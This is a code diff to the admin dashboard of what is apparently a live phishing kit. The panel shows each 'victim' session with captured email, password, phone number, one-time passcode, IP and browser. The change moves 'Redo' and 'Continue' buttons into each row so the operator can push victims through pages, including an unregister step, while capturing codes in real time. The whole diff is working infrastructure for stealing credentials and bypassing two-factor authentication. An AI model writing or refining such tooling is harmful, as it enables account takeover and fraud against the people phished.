@@ -94,11 +94,7 @@
         <h3 style="margin:0">Session Detail</h3><button onclick="closeModal()" class="btn">✕</button>
       </div>
       <div id="modalBody" style="margin-top:1rem;font-size:13px;line-height:1.6"></div>
-      <div style="margin-top:1.25rem;display:flex;gap:8px">
-        <button id="redoBtn"  class="btn" onclick="act('redo',  currentSid)">🔁 Redo</button>
-        <button id="contBtn"  class="btn" onclick="act('cont',  currentSid)">✅ Continue</button>
-        <button class="btn" onclick="act('delete',currentSid)">🗑 Delete</button>
-      </div>
+      <!-- BUTTONS REMOVED FROM HERE -->
     </div>
   </div>
 
@@ -138,19 +134,37 @@
       const empty= qs('#empty');
       if(!d.sessions.length){ body.innerHTML=''; empty.style.display='block'; return; }
       empty.style.display='none';
-      body.innerHTML = d.sessions.map(s=>`
-        <tr>
-          <td>${s.victimNum}</td>
-          <td><span class="cred">${s.email||'—'}</span></td>
-          <td><span class="cred">${s.password||'—'}</span></td>
-          <td><span class="cred">${s.phone||'—'}</span></td>
-          <td><span class="cred">${s.otp||'—'}</span></td>
-          <td>${s.ip}</td>
-          <td>${s.platform}</td>
-          <td>${s.browser}</td>
-          <td>${pageTitle(s.page)}</td>
-          <td><button class="btn" onclick="showDetail('${s.sid}')">Manage</button></td>
-        </tr>`).join('');
+
+      /* =====  BUILD ROWS  ===== */
+      body.innerHTML = d.sessions.map(s=>{
+        /* buttons for each row */
+        const buttons = [];
+        // 1.  Manage (detail popup)
+        buttons.push(`<button class="btn" onclick="showDetail('${s.sid}')">Manage</button>`);
+
+        // 2.  Redo / Continue  (only if victim clicked unregister)
+        if (s.page==='unregister.html' && s.unregisterClicked && s.status==='wait') {
+          buttons.push(`<button class="btn" onclick="act('cont','${s.sid}')">Continue</button>`);
+        } else if (s.page!=='unregister.html' && s.page!=='success') {
+          // for other pages show both Redo & Continue outside modal
+          buttons.push(`<button class="btn" onclick="act('redo','${s.sid}')">Redo</button>`);
+          buttons.push(`<button class="btn" onclick="act('cont','${s.sid}')">Continue</button>`);
+        }
+
+        return `
+          <tr>
+            <td>${s.victimNum}</td>
+            <td><span class="cred">${s.email||'—'}</span></td>
+            <td><span class="cred">${s.password||'—'}</span></td>
+            <td><span class="cred">${s.phone||'—'}</span></td>
+            <td><span class="cred">${s.otp||'—'}</span></td>
+            <td>${s.ip}</td>
+            <td>${s.platform}</td>
+            <td>${s.browser}</td>
+            <td>${pageTitle(s.page)}</td>
+            <td style="display:flex;gap:6px;">${buttons.join('')}</td>
+          </tr>`;
+      }).join('');
     }
 
     function showDetail(sid){
@@ -173,10 +187,8 @@
         <div class="detail">User-Agent</div><div style="word-break:break-all">${s.ua}</div>
         <div class="detail">Date</div><div>${localDate}</div>`;
 
-      // NO REDO for unregister page
-      qs('#redoBtn').style.display  = (s.page==='success' || s.page==='unregister.html') ? 'none':'inline-block';
-      qs('#contBtn').style.display  = s.page==='success' ? 'none':'inline-block';
-      qs('#modal').style.display   = 'flex';
+      // no buttons inside modal any more
+      qs('#modal').style.display = 'flex';
     }
     function closeModal(){ qs('#modal').style.display='none'; }
 
